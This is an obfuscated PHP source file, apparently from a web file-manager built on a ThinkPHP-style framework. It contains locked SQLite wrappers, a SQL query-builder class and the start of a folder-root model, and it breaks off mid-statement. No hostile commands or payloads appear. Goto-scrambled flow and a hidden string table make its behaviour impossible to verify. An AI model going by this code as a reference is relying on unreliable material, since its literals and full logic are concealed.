<?php
 goto FƗ; A׺: class DbSqlite extends DbSqliteBase { public function query($B宱) { goto Fΐ; fݤ: if (!$Fᖤ) { return !1; } if (flock($Fᖤ, LOCK_EX)) { $C毙 = parent::query($B宱); flock($Fᖤ, LOCK_UN); fclose($Fᖤ); return $C毙; } flock($Fᖤ, LOCK_UN); goto E; Fΐ: $cӎ鑆 =& $_SERVER[놫Ӱ]; $c = DATA_PATH . $cӎ鑆[865]; $Fᖤ = fopen($c, $cӎ鑆[866]); goto fݤ; E: fclose($Fᖤ); show_json($cӎ鑆[867], !1); return !1; goto F; F: } public function execute($CԾ) { goto Aȕ; D˺͵: fclose($eѾ׺); show_json($Bǆĵ[867], !1); return !1; goto Cߖ; A˷: if (!$eѾ׺) { return !1; } if (flock($eѾ׺, LOCK_EX)) { $Bڇ = parent::execute($CԾ); flock($eѾ׺, LOCK_UN); fclose($eѾ׺); return $Bڇ; } flock($eѾ׺, LOCK_UN); goto D˺͵; Aȕ: $Bǆĵ =& $_SERVER[놫Ӱ]; $eڹ = DATA_PATH . $Bǆĵ[865]; $eѾ׺ = fopen($eڹ, $Bǆĵ[866]); goto A˷; Cߖ: } } class DbSqlite3 extends DbSqlite3Base { public function query($E̯) { goto F; E: if (!$e֓抛) { return !1; } if (flock($e֓抛, LOCK_EX)) { $f = parent::query($E̯); flock($e֓抛, LOCK_UN); fclose($e֓抛); return $f; } flock($e֓抛, LOCK_UN); goto dՍ; F: $A =& $_SERVER[놫Ӱ]; $dǙ = DATA_PATH . $A[865]; $e֓抛 = fopen($dǙ, $A[866]); goto E; dՍ: fclose($e֓抛); show_json($A[867], !1); return !1; goto Fͯ; Fͯ: } public function execute($c牎ޭ) { goto bꦜ; cǸ: fclose($eͻ); show_json($Eԇǲ[867], !1); return !1; goto e㗧; bꦜ: $Eԇǲ =& $_SERVER[놫Ӱ]; $e = DATA_PATH . $Eԇǲ[865]; $eͻ = fopen($e, $Eԇǲ[866]); goto b; b: if (!$eͻ) { return !1; } if (flock($eͻ, LOCK_EX)) { $a咯 = parent::execute($c牎ޭ); flock($eͻ, LOCK_UN); fclose($eͻ); return $a咯; } flock($eͻ, LOCK_UN); goto cǸ; e㗧: } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\150\151\x6e\x6b\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $exp = array("\x65\161" => "\x3d", "\156\x65\x71" => "\74\x3e", "\x67\164" => "\76", "\x65\147\x74" => "\76\x3d", "\154\164" => "\74", "\x65\154\x74" => "\74\75", "\156\x6f\164\154\151\153\145" => "\x4e\117\124\x20\114\x49\x4b\x45", "\154\x69\153\145" => "\114\x49\113\x45", "\151\156" => "\111\116", "\x6e\157\x74\x69\156" => "\116\117\x54\40\111\x4e", "\156\x6f\x74\40\151\156" => "\116\x4f\x54\x20\111\x4e", "\142\145\164\167\x65\145\x6e" => "\x42\105\x54\127\105\x45\x4e", "\x6e\157\164\142\145\x74\167\145\145\156" => "\x4e\x4f\x54\40\102\x45\x54\127\x45\105\116", "\x6e\x6f\x74\x20\x62\x65\x74\167\145\145\156" => "\116\117\x54\40\x42\105\124\x57\105\105\x4e"); protected $selectSql = "\x53\x45\x4c\105\103\124\45\104\x49\123\124\111\x4e\x43\124\x25\x20\x25\106\x49\105\114\104\45\x20\x46\x52\117\x4d\40\x25\124\x41\x42\114\105\x25\x25\x4a\x4f\x49\x4e\45\45\x57\x48\105\x52\x45\45\45\107\122\x4f\x55\120\45\x25\x48\101\x56\x49\116\x47\45\x25\x4f\x52\104\x45\x52\x25\45\x4c\x49\115\x49\x54\45\40\45\125\x4e\x49\x4f\x4e\45\x25\103\x4f\115\115\105\x4e\124\x25"; protected $bind = array(); public static function getInstance() { $A = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[놫Ӱ][868], $A); } public function factory($B = '') { goto C䂱; C䂱: $EՋ =& $_SERVER[놫Ӱ]; $B = $this->parseConfig($B); if (empty($B[$EՋ[869]])) { think_exception(think_lang($EՋ[870])); } goto a峐Ķ; Cۥ: return $D; goto d; a峐Ķ: $this->dbType = ucwords(strtolower($B[$EՋ[869]])); $C = $EՋ[871] . $this->dbType; if (class_exists($C)) { $D = new $C($B); if ($EՋ[719] != strtolower($B[$EՋ[869]])) { $D->dbType = strtoupper($this->dbType); } else { $D->dbType = $this->_getDsnType($B[$EՋ[821]]); } } else { think_exception(think_lang($EՋ[872]) . $EՋ[873] . $C); } goto Cۥ; d: } public function __call($aӛݣ, $cˌݓ) { if (method_exists($this, $aӛݣ)) { return call_user_func_array(array($this, $aӛݣ), $cˌݓ); } } protected function _getDsnType($eۻ노ī) { $Aˋ = explode($_SERVER[놫Ӱ][4], $eۻ노ī); $CŤÏ = strtoupper(trim($Aˋ[0])); return $CŤÏ; } private function parseConfig($e푇 = '') { $A띅 =& $_SERVER[놫Ӱ]; if (!empty($e푇) && is_string($e푇)) { $e푇 = $this->parseDSN($e푇); } elseif (is_array($e푇)) { $e푇 = array_change_key_case($e푇); $e푇 = array($A띅[869] => $e푇[$A띅[874]], $A띅[793] => $e푇[$A띅[875]], $A띅[794] => $e푇[$A띅[876]], $A띅[791] => $e푇[$A띅[877]], $A띅[792] => $e푇[$A띅[878]], $A띅[17] => $e푇[$A띅[879]], $A띅[821] => $e푇[$A띅[880]], $A띅[13] => $e푇[$A띅[881]]); } elseif (empty($e푇)) { if (think_config($A띅[721]) && $A띅[719] != strtolower(think_config($A띅[718]))) { $e푇 = $this->parseDSN(think_config($A띅[721])); } else { $e푇 = array($A띅[869] => think_config($A띅[718]), $A띅[793] => think_config($A띅[882]), $A띅[794] => think_config($A띅[883]), $A띅[791] => think_config($A띅[884]), $A띅[792] => think_config($A띅[885]), $A띅[17] => think_config($A띅[231]), $A띅[821] => think_config($A띅[721]), $A띅[13] => think_config($A띅[886])); } } return $e푇; } protected function initConnect($fꊂ = true) { if (1 == think_config($_SERVER[놫Ӱ][18])) { $this->_linkID = $this->multiConnect($fꊂ); } else { if (!$this->connected) { $this->_linkID = $this->connect(); } } } protected function multiConnect($bĈ = false) { $bͩ =& $_SERVER[놫Ӱ]; static $D = array(); if (empty($D)) { foreach ($this->config as $d => $B) { $D[$d] = explode($bͩ[47], $B); } } if (think_config($bͩ[887])) { if ($bĈ) { $Bև = floor(mt_rand(0, think_config($bͩ[888]) - 1)); } else { if (is_numeric(think_config($bͩ[889]))) { $Bև = think_config($bͩ[889]); } else { $Bև = floor(mt_rand(think_config($bͩ[888]), count($D[$bͩ[791]]) - 1)); } } } else { $Bև = floor(mt_rand(0, count($D[$bͩ[791]]) - 1)); } $Dع = array($bͩ[793] => isset($D[$bͩ[793]][$Bև]) ? $D[$bͩ[793]][$Bև] : $D[$bͩ[793]][0], $bͩ[794] => isset($D[$bͩ[794]][$Bև]) ? $D[$bͩ[794]][$Bև] : $D[$bͩ[794]][0], $bͩ[791] => isset($D[$bͩ[791]][$Bև]) ? $D[$bͩ[791]][$Bև] : $D[$bͩ[791]][0], $bͩ[792] => isset($D[$bͩ[792]][$Bև]) ? $D[$bͩ[792]][$Bև] : $D[$bͩ[792]][0], $bͩ[17] => isset($D[$bͩ[17]][$Bև]) ? $D[$bͩ[17]][$Bև] : $D[$bͩ[17]][0], $bͩ[821] => isset($D[$bͩ[821]][$Bև]) ? $D[$bͩ[821]][$Bև] : $D[$bͩ[821]][0], $bͩ[13] => isset($D[$bͩ[13]][$Bև]) ? $D[$bͩ[13]][$Bև] : $D[$bͩ[13]][0]); return $this->connect($Dع, $Bև); } public function parseDSN($b) { $d萘Ă =& $_SERVER[놫Ӱ]; if (empty($b)) { return !1; } $f = parse_url($b); if ($f[$d萘Ă[165]]) { $aˈ = array($d萘Ă[869] => $f[$d萘Ă[165]], $d萘Ă[793] => isset($f[$d萘Ă[527]]) ? $f[$d萘Ă[527]] : $d萘Ă[33], $d萘Ă[794] => isset($f[$d萘Ă[890]]) ? $f[$d萘Ă[890]] : $d萘Ă[33], $d萘Ă[791] => isset($f[$d萘Ă[166]]) ? $f[$d萘Ă[166]] : $d萘Ă[33], $d萘Ă[792] => isset($f[$d萘Ă[167]]) ? $f[$d萘Ă[167]] : $d萘Ă[33], $d萘Ă[17] => isset($f[$d萘Ă[76]]) ? substr($f[$d萘Ă[76]], 1) : $d萘Ă[33]); } else { preg_match($d萘Ă[891], trim($b), $F); $aˈ = array($d萘Ă[869] => $F[1], $d萘Ă[793] => $F[2], $d萘Ă[794] => $F[3], $d萘Ă[791] => $F[4], $d萘Ă[792] => $F[5], $d萘Ă[17] => $F[6]); } $aˈ[$d萘Ă[821]] = $d萘Ă[33]; return $aˈ; } protected function debug() { $bخ =& $_SERVER[놫Ӱ]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $bخ[892]; if (think_config($bخ[893])) { think_status($bخ[894]); think_trace($this->queryStr . $bخ[895] . think_status($bخ[20], $bخ[894], 6) . $bخ[896], $bخ[33], $bخ[897]); } } protected function parseLock($bӄ = false) { $d˱ =& $_SERVER[놫Ӱ]; if (!$bӄ) { return $d˱[33]; } if ($d˱[823] == $this->dbType) { return $d˱[898]; } return $d˱[899]; } protected function parseSet($c) { $Dײ =& $_SERVER[놫Ӱ]; foreach ($c as $c笋 => $aِ) { if (is_array($aِ) && $Dײ[282] == $aِ[0]) { $Bݕ[] = $this->parseKey($c笋) . $Dײ[900] . $aِ[1]; } elseif (is_scalar($aِ) || is_null($aِ)) { $Bݕ[] = $this->parseKey($c笋) . $Dײ[900] . $this->parseValue($aِ); } } return $Dײ[901] . implode($Dײ[47], $Bݕ); } protected function bindParam($A, $d϶ǂ) { $this->bind[$_SERVER[놫Ӱ][4] . $A] = $d϶ǂ; } protected function parseBind($a) { $a = array_merge($this->bind, $a); $this->bind = array(); return $a; } function parseKey(&$dɯȧ, $Eĺ٥ = true) { if ($Eĺ٥) { $dɯȧ = $this->parseKeyCheck($dɯȧ); } return $dɯȧ; } function parseKeyCheck($D߭) { $d =& $_SERVER[놫Ӱ]; $D߭ = trim($D߭); if (!preg_match($d[902], $D߭)) { think_exception($d[903] . $D߭); } return $D߭; } protected function parseValue($F烱) { $a雒 =& $_SERVER[놫Ӱ]; if (is_string($F烱)) { $F烱 = $a雒[862] . $this->escapeString($F烱) . $a雒[862]; } elseif (isset($F烱[0]) && is_string($F烱[0]) && strtolower($F烱[0]) == $a雒[282]) { $F烱 = $this->escapeString($F烱[1]); } elseif (is_array($F烱)) { $F烱 = array_map(array($this, $a雒[863]), $F烱); } elseif (is_bool($F烱)) { $F烱 = $F烱 ? $a雒[493] : $a雒[464]; } elseif (is_null($F烱)) { $F烱 = $a雒[100]; } return $F烱; } protected function parseField($C꽭) { $C퉌 =& $_SERVER[놫Ӱ]; if (is_string($C꽭) && strpos($C꽭, $C퉌[47])) { $C꽭 = explode($C퉌[47], $C꽭); } if (is_array($C꽭)) { $Aٶ = array(); foreach ($C꽭 as $Bك => $d) { if (!is_numeric($Bك)) { $Aٶ[] = $this->parseKey($Bك) . $C퉌[904] . $this->parseKey($d); } else { $Aٶ[] = $this->parseKey($d); } } $Bǚʹ = implode($C퉌[47], $Aٶ); } elseif (is_string($C꽭) && !empty($C꽭)) { $Bǚʹ = $C꽭; } else { $Bǚʹ = $C퉌[173]; } return $Bǚʹ; } protected function parseTable($eѱド) { $F =& $_SERVER[놫Ӱ]; if (is_array($eѱド)) { $Dڹ = array(); foreach ($eѱド as $b => $dͳ) { if (!is_numeric($b)) { $Dڹ[] = $this->parseKey($b) . $F[50] . $this->parseKey($dͳ); } else { $Dڹ[] = $this->parseKey($b); } } $eѱド = $Dڹ; } elseif (is_string($eѱド)) { if (strstr($eѱド, $F[50])) { return $eѱド; } $eѱド = explode($F[47], $eѱド); array_walk($eѱド, array($this, $F[810])); } return $F[905] . trim(implode($F[906], $eѱド), $F[816]) . $F[905]; } protected function parseWhere($aЎ) { $FՇ΃ =& $_SERVER[놫Ӱ]; $e = $FՇ΃[33]; if (is_string($aЎ)) { $e = $aЎ; } else { $cδ = isset($aЎ[$FՇ΃[907]]) ? strtoupper($aЎ[$FՇ΃[907]]) : $FՇ΃[33]; if (in_array($cδ, array($FՇ΃[908], $FՇ΃[909], $FՇ΃[910]))) { $cδ = $FՇ΃[50] . $cδ . $FՇ΃[50]; unset($aЎ[$FՇ΃[907]]); } else { $cδ = $FՇ΃[911]; } foreach ($aЎ as $F => $cٍ̤) { $e .= $FՇ΃[262]; if (is_numeric($F)) { $F = $FՇ΃[912]; } if (0 === strpos($F, $FՇ΃[71])) { $e .= $this->parseThinkWhere($F, $cٍ̤); } else { if (!preg_match($FՇ΃[913], trim($F))) { think_exception(think_lang($FՇ΃[914]) . $FՇ΃[4] . $F); } $f = is_array($cٍ̤) && isset($cٍ̤[$FՇ΃[915]]); $F = trim($F); if (strpos($F, $FՇ΃[268])) { $f½ = explode($FՇ΃[268], $F); $dą = array(); foreach ($f½ as $A纑 => $f԰) { $a鬦 = $f ? $cٍ̤[$A纑] : $cٍ̤; $dą[] = $FՇ΃[245] . $this->parseWhereItem($this->parseKey($f԰), $a鬦) . $FՇ΃[809]; } $e .= implode($FՇ΃[916], $dą); } elseif (strpos($F, $FՇ΃[269])) { $f½ = explode($FՇ΃[269], $F); $dą = array(); foreach ($f½ as $A纑 => $f԰) { $a鬦 = $f ? $cٍ̤[$A纑] : $cٍ̤; $dą[] = $FՇ΃[245] . $this->parseWhereItem($this->parseKey($f԰), $a鬦) . $FՇ΃[809]; } $e .= implode($FՇ΃[911], $dą); } else { $e .= $this->parseWhereItem($this->parseKey($F), $cٍ̤); } } $e .= $FՇ΃[263] . $cδ; } $e = substr($e, 0, -strlen($cδ)); } return empty($e) ? $FՇ΃[33] : $FՇ΃[917] . $e; } protected function parseWhereItem($aͪɈ, $dӛŌ) { $BƯĺ =& $_SERVER[놫Ӱ]; $f = $BƯĺ[33]; if (is_array($dӛŌ)) { if (is_string($dӛŌ[0])) { $a´ = strtolower($dӛŌ[0]); if (in_array($dӛŌ[0], array($BƯĺ[900], $BƯĺ[918], $BƯĺ[919], $BƯĺ[920], $BƯĺ[921], $BƯĺ[922]))) { $f .= $aͪɈ . $BƯĺ[50] . $dӛŌ[0] . $BƯĺ[50] . $this->parseValue($dӛŌ[1]); } elseif (preg_match($BƯĺ[923], $dӛŌ[0])) { $f .= $aͪɈ . $BƯĺ[50] . $this->exp[$a´] . $BƯĺ[50] . $this->parseValue($dӛŌ[1]); } elseif (preg_match($BƯĺ[924], $dӛŌ[0])) { if (is_array($dӛŌ[1])) { $A = isset($dӛŌ[2]) ? strtoupper($dӛŌ[2]) : $BƯĺ[909]; if (in_array($A, array($BƯĺ[908], $BƯĺ[909], $BƯĺ[910]))) { $Fߒ = array(); foreach ($dӛŌ[1] as $f) { $Fߒ[] = $aͪɈ . $BƯĺ[50] . $this->exp[$a´] . $BƯĺ[50] . $this->parseValue($f); } $f .= $BƯĺ[245] . implode($BƯĺ[50] . $A . $BƯĺ[50], $Fߒ) . $BƯĺ[809]; } } else { $f .= $aͪɈ . $BƯĺ[50] . $this->exp[$a´] . $BƯĺ[50] . $this->parseValue($dӛŌ[1]); } } elseif ($BƯĺ[282] == $a´) { $f .= $BƯĺ[807] . $aͪɈ . $BƯĺ[50] . $dӛŌ[1] . $BƯĺ[925]; } elseif (preg_match($BƯĺ[926], $dӛŌ[0])) { if (isset($dӛŌ[2]) && $BƯĺ[282] == $dӛŌ[2]) { $f .= $aͪɈ . $BƯĺ[50] . $this->exp[$a´] . $BƯĺ[50] . $dӛŌ[1]; } else { if (is_string($dӛŌ[1])) { $dӛŌ[1] = explode($BƯĺ[47], $dӛŌ[1]); } $Cҩ = implode($BƯĺ[47], $this->parseValue($dӛŌ[1])); $f .= $aͪɈ . $BƯĺ[50] . $this->exp[$a´] . $BƯĺ[807] . $Cҩ . $BƯĺ[809]; } } elseif (preg_match($BƯĺ[927], $dӛŌ[0])) { $D = is_string($dӛŌ[1]) ? explode($BƯĺ[47], $dӛŌ[1]) : $dӛŌ[1]; $f .= $BƯĺ[807] . $aͪɈ . $BƯĺ[50] . $this->exp[$a´] . $BƯĺ[50] . $this->parseValue($D[0]) . $BƯĺ[911] . $this->parseValue($D[1]) . $BƯĺ[263]; } else { think_exception(think_lang($BƯĺ[914]) . $BƯĺ[4] . $dӛŌ[0]); } } else { $Aҫ = count($dӛŌ); $FۡŊ = isset($dӛŌ[$Aҫ - 1]) ? strtoupper($dӛŌ[$Aҫ - 1]) : $BƯĺ[33]; if (in_array($FۡŊ, array($BƯĺ[908], $BƯĺ[909], $BƯĺ[910]))) { $Aҫ = $Aҫ - 1; } else { $FۡŊ = $BƯĺ[908]; } for ($Fǭǂ = 0; $Fǭǂ < $Aҫ; $Fǭǂ++) { $D = is_array($dӛŌ[$Fǭǂ]) ? $dӛŌ[$Fǭǂ][1] : $dӛŌ[$Fǭǂ]; if ($BƯĺ[282] == strtolower($dӛŌ[$Fǭǂ][0])) { $f .= $BƯĺ[245] . $aͪɈ . $BƯĺ[50] . $D . $BƯĺ[925] . $FۡŊ . $BƯĺ[50]; } else { $C࠲ = is_array($dӛŌ[$Fǭǂ]) ? $this->exp[strtolower($dӛŌ[$Fǭǂ][0])] : $BƯĺ[900]; if (!$C࠲ && is_array($dӛŌ[$Fǭǂ]) && in_array($dӛŌ[$Fǭǂ][0], array($BƯĺ[900], $BƯĺ[918], $BƯĺ[919], $BƯĺ[920], $BƯĺ[921], $BƯĺ[922]))) { $C࠲ = $dӛŌ[$Fǭǂ][0]; } $f .= $BƯĺ[245] . $aͪɈ . $BƯĺ[50] . $C࠲ . $BƯĺ[50] . $this->parseValue($D) . $BƯĺ[925] . $FۡŊ . $BƯĺ[50]; } } $f = substr($f, 0, -4); } } else { $f .= $aͪɈ . $BƯĺ[928] . $this->parseValue($dӛŌ); } return $f; } protected function parseThinkWhere($dʮ, $Aߊ⬷) { $dﶍ =& $_SERVER[놫Ӱ]; $F˘ = $dﶍ[33]; switch ($dʮ) { case $dﶍ[335]: $F˘ = $Aߊ⬷; break; case $dﶍ[912]: $F˘ = is_string($Aߊ⬷) ? $Aߊ⬷ : substr($this->parseWhere($Aߊ⬷), 6); break; case $dﶍ[929]: parse_str($Aߊ⬷, $f); if (isset($f[$dﶍ[907]])) { $Fġ = $dﶍ[50] . strtoupper($f[$dﶍ[907]]) . $dﶍ[50]; unset($f[$dﶍ[907]]); } else { $Fġ = $dﶍ[911]; } $f샽 = array(); foreach ($f as $fÕ => $ḅ͆) { $f샽[] = $this->parseKey($fÕ) . $dﶍ[928] . $this->parseValue($ḅ͆); } $F˘ = implode($Fġ, $f샽); break; } return $F˘; } protected function parseLimit($DօɌŞ) { $Aۥ =& $_SERVER[놫Ӱ]; return !empty($DօɌŞ) ? $Aۥ[48] . $DօɌŞ . $Aۥ[50] : $Aۥ[33]; } protected function parseJoin($c) { $bƱ =& $_SERVER[놫Ӱ]; $DۈÂ = $bƱ[33]; if (!empty($c)) { if (is_array($c)) { foreach ($c as $Bß䙜 => $c) { if (!1 !== stripos($c, $bƱ[930])) { $DۈÂ .= $bƱ[50] . $c; } else { $DۈÂ .= $bƱ[931] . $c; } } } else { $DۈÂ .= $bƱ[931] . $c; } } $DۈÂ = preg_replace($bƱ[932], think_config($bƱ[835]) . $bƱ[933], $DۈÂ); return $DۈÂ; } protected function parseOrder($eΔ) { $F =& $_SERVER[놫Ӱ]; if (is_array($eΔ)) { $f둆 = array(); foreach ($eΔ as $CՅ => $e) { if (is_numeric($CՅ)) { $f둆[] = $this->parseKey($e); } else { $e = in_array(strtoupper(trim($e)), array($F[934], $F[935])) ? $F[50] . $e : $F[33]; if (preg_match($F[936], $CՅ)) { $f둆[] = $this->parseKey($CՅ) . $e; } else { think_exception($F[937] . $CՅ); } } } $eΔ = implode($F[47], $f둆); } return !empty($eΔ) ? $F[938] . $eΔ : $F[33]; } protected function parseGroup($D惭֒) { $BΗو =& $_SERVER[놫Ӱ]; return !empty($D惭֒) ? $BΗو[939] . $D惭֒ : $BΗو[33]; } protected function parseHaving($D揧) { $C鞸 =& $_SERVER[놫Ӱ]; return !empty($D揧) ? $C鞸[940] . $D揧 : $C鞸[33]; } protected function parseComment($F澩) { $bҊ =& $_SERVER[놫Ӱ]; return !empty($F澩) ? $bҊ[941] . $F澩 . $bҊ[942] : $bҊ[33]; } protected function parseDistinct($d٘) { $cÖ =& $_SERVER[놫Ӱ]; return !empty($d٘) ? $cÖ[943] : $cÖ[33]; } protected function parseUnion($Dĥ) { $b֛ =& $_SERVER[놫Ӱ]; if (empty($Dĥ)) { return $b֛[33]; } if (isset($Dĥ[$b֛[333]])) { $f = $b֛[944]; unset($Dĥ[$b֛[333]]); } else { $f = $b֛[945]; } foreach ($Dĥ as $c) { $EХ[] = $f . (is_array($c) ? $this->buildSelectSql($c) : $c); } return implode($b֛[50], $EХ); } public function insert($D, $A˲룡 = array(), $dՇ = false) { goto B; B: $c =& $_SERVER[놫Ӱ]; $AƉ = $a؈ = array(); $this->model = $A˲룡[$c[266]]; goto C޹; C睷: $eฯ .= $this->parseComment(!empty($A˲룡[$c[337]]) ? $A˲룡[$c[337]] : $c[33]); return $this->execute($eฯ, $this->parseBind(!empty($A˲룡[$c[270]]) ? $A˲룡[$c[270]] : array())); goto d; C޹: foreach ($D as $c => $f) { if (is_array($f) && $c[282] == $f[0]) { $a؈[] = $this->parseKey($c); $AƉ[] = $f[1]; } elseif (is_scalar($f) || is_null($f)) { $a؈[] = $this->parseKey($c); $AƉ[] = $this->parseValue($f); } } $eฯ = ($dՇ ? $c[811] : $c[812]) . $c[813] . $this->parseTable($A˲룡[$c[264]]) . $c[807] . implode($c[47], $a؈) . $c[808] . implode($c[47], $AƉ) . $c[809]; $eฯ .= $this->parseLock(isset($A˲룡[$c[763]]) ? $A˲룡[$c[763]] : !1); goto C睷; d: } public function selectInsert($E̸, $AЍʍ, $aǉ = array()) { goto eٮ; fމ: return $this->execute($aǾް̋, $this->parseBind(!empty($aǉ[$a¬[270]]) ? $aǉ[$a¬[270]] : array())); goto A; E沚Ƣ: array_walk($E̸, array($this, $a¬[810])); $aǾް̋ = $a¬[946] . $this->parseTable($AЍʍ) . $a¬[807] . implode($a¬[47], $E̸) . $a¬[925]; $aǾް̋ .= $this->buildSelectSql($aǉ); goto fމ; eٮ: $a¬ =& $_SERVER[놫Ӱ]; $this->model = $aǉ[$a¬[266]]; if (is_string($E̸)) { $E̸ = explode($a¬[47], $E̸); } goto E沚Ƣ; A: } public function update($a膅, $eőď) { $d =& $_SERVER[놫Ӱ]; $this->model = $eőď[$d[266]]; $A = $d[947] . $this->parseTable($eőď[$d[264]]) . $this->parseSet($a膅) . $this->parseWhere(!empty($eőď[$d[260]]) ? $eőď[$d[260]] : $d[33]) . $this->parseOrder(!empty($eőď[$d[346]]) ? $eőď[$d[346]] : $d[33]) . $this->parseLimit(!empty($eőď[$d[277]]) ? $eőď[$d[277]] : $d[33]) . $this->parseLock(isset($eőď[$d[763]]) ? $eőď[$d[763]] : !1) . $this->parseComment(!empty($eőď[$d[337]]) ? $eőď[$d[337]] : $d[33]); return $this->execute($A, $this->parseBind(!empty($eőď[$d[270]]) ? $eőď[$d[270]] : array())); } public function delete($E􎩻 = array()) { $BՇˍ =& $_SERVER[놫Ӱ]; $this->model = $E􎩻[$BՇˍ[266]]; $C׵ = $BՇˍ[948] . $this->parseTable($E􎩻[$BՇˍ[264]]) . $this->parseWhere(!empty($E􎩻[$BՇˍ[260]]) ? $E􎩻[$BՇˍ[260]] : $BՇˍ[33]) . $this->parseOrder(!empty($E􎩻[$BՇˍ[346]]) ? $E􎩻[$BՇˍ[346]] : $BՇˍ[33]) . $this->parseLimit(!empty($E􎩻[$BՇˍ[277]]) ? $E􎩻[$BՇˍ[277]] : $BՇˍ[33]) . $this->parseLock(isset($E􎩻[$BՇˍ[763]]) ? $E􎩻[$BՇˍ[763]] : !1) . $this->parseComment(!empty($E􎩻[$BՇˍ[337]]) ? $E􎩻[$BՇˍ[337]] : $BՇˍ[33]); return $this->execute($C׵, $this->parseBind(!empty($E􎩻[$BՇˍ[270]]) ? $E􎩻[$BՇˍ[270]] : array())); } public function select($F = array()) { goto Bօ; Bօ: $aί =& $_SERVER[놫Ӱ]; $this->model = $F[$aί[266]]; $c = $this->buildSelectSql($F); goto cܳ; cܳ: $Bإ̓ = isset($F[$aί[334]]) ? $F[$aί[334]] : !1; if ($Bإ̓) { $D = is_string($Bإ̓[$aί[88]]) ? $Bإ̓[$aί[88]] : $aί[949] . md5($c); $fڸ = think_cache($D, $aί[33], $Bإ̓); if (!1 !== $fڸ) { return $fڸ; } } $c浺 = $this->query($c, $this->parseBind(!empty($F[$aί[270]]) ? $F[$aί[270]] : array())); goto f; f: if ($Bإ̓ && !1 !== $c浺) { think_cache($D, $c浺, $Bإ̓); } return $c浺; goto aۧӼ; aۧӼ: } public function buildSelectSql($Bӥ = array()) { goto e뻒; e뻒: $dͬʚ =& $_SERVER[놫Ӱ]; if (isset($Bӥ[$dͬʚ[336]])) { if (strpos($Bӥ[$dͬʚ[336]], $dͬʚ[47])) { list($B, $a¢) = explode($dͬʚ[47], $Bӥ[$dͬʚ[336]]); } else { $B = $Bӥ[$dͬʚ[336]]; } $B = $B ? $B : 1; $a¢ = isset($a¢) ? $a¢ : (is_numeric($Bӥ[$dͬʚ[277]]) ? $Bӥ[$dͬʚ[277]] : 20); $f = $a¢ * ((int) $B - 1); $Bӥ[$dͬʚ[277]] = $f . $dͬʚ[47] . $a¢; } if (think_config($dͬʚ[950])) { $b뚤 = $dͬʚ[951] . md5(serialize($Bӥ)); $Bшؖ = think_cache($b뚤); if ($Bшؖ) { return $Bшؖ; } } goto eԊ; fͺ: return $B; goto bЪƈ; eԊ: $B = $this->parseSql($this->selectSql, $Bӥ); $B .= $this->parseLock(isset($Bӥ[$dͬʚ[763]]) ? $Bӥ[$dͬʚ[763]] : !1); if (isset($b뚤)) { think_cache($b뚤, $B); } goto fͺ; bЪƈ: } public function parseSql($c늯, $b燡Ă = array()) { $d =& $_SERVER[놫Ӱ]; $c늯 = str_replace(array($d[952], $d[953], $d[954], $d[955], $d[956], $d[957], $d[958], $d[959], $d[960], $d[961], $d[962]), array($this->parseTable("{$b燡Ă[$d[264]]}"), $this->parseDistinct(isset($b燡Ă[$d[963]]) ? $b燡Ă[$d[963]] : !1), $this->parseField(!empty($b燡Ă[$d[258]]) ? $b燡Ă[$d[258]] : $d[173]), $this->parseJoin(!empty($b燡Ă[$d[267]]) ? $b燡Ă[$d[267]] : $d[33]), $this->parseWhere(!empty($b燡Ă[$d[260]]) ? $b燡Ă[$d[260]] : $d[33]), $this->parseGroup(!empty($b燡Ă[$d[964]]) ? $b燡Ă[$d[964]] : $d[33]), $this->parseHaving(!empty($b燡Ă[$d[965]]) ? $b燡Ă[$d[965]] : $d[33]), $this->parseOrder(!empty($b燡Ă[$d[346]]) ? $b燡Ă[$d[346]] : $d[33]), $this->parseLimit(!empty($b燡Ă[$d[277]]) ? $b燡Ă[$d[277]] : $d[33]), $this->parseUnion(!empty($b燡Ă[$d[332]]) ? $b燡Ă[$d[332]] : $d[33]), $this->parseComment(!empty($b燡Ă[$d[337]]) ? $b燡Ă[$d[337]] : $d[33])), $c늯); return $c늯; } public function getLastSql($eԋ = '') { return $eԋ ? $this->modelSql[$eԋ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($dņ) { return addslashes($dņ); } public function setModel($Cɲ) { $this->model = $Cɲ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto aτ섯; dˆ: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($Fî) { $Fɣ =& $_SERVER[놫Ӱ]; $E = Model($Fɣ[466])->where(array($Fɣ[1330] => $Fî))->find(); $dྍȂ = $this->_mkdirRoot(SourceModel::TYPE_USER, $Fî, $E[$Fɣ[28]]); $this->userDesktopAdd($dྍȂ); return $dྍȂ; } public function userDesktopAdd($cࢆ) { $D焍 =& $_SERVER[놫Ӱ]; $A򒑏 = LNG($D焍[2217]); $fƠ = $this->mkdir($cࢆ, $A򒑏); $this->metaSet($fƠ, $D焍[2218], $D焍[493]); $this->metaSet($cࢆ, $D焍[2219], $fƠ); } public function groupRootAdd($Eǋ) { $d =& $_SERVER[놫Ӱ]; $Dۄܵţ = Model($d[454])->where(array($d[2079] => $Eǋ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $Eǋ, $Dۄܵţ[$d[28]]); } public function systemRootPathAdd($F⟮) { if ($F⟮ != $_SERVER[놫Ӱ][1056]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $F⟮); } public function userRootRemove($fĂ) { $e轐 = $this->sourceRoot(SourceModel::TYPE_USER, $fĂ); if (!$e轐) { return; } $this->remove($e轐, !1); } public function groupRootRemove($Eَ) { $c擅 = $this->sourceRoot(SourceModel::TYPE_GROUP, $Eَ); if (!$c擅) { return; } $this->remove($c擅, !1); } private function _mkdirRoot($dъ, $d, $Dۚ) { goto f鈍; c: CacheLock::unlock($Fل); return $a¶ϵ; goto FՍ賅; b: $a¶ϵ = $this->add($cм򑕃); $Aݰ = array($d[519] => short_id($a¶ϵ)); $this->where(array($d[380] => $a¶ϵ))->save($Aݰ); goto c; F˵: $Fل = 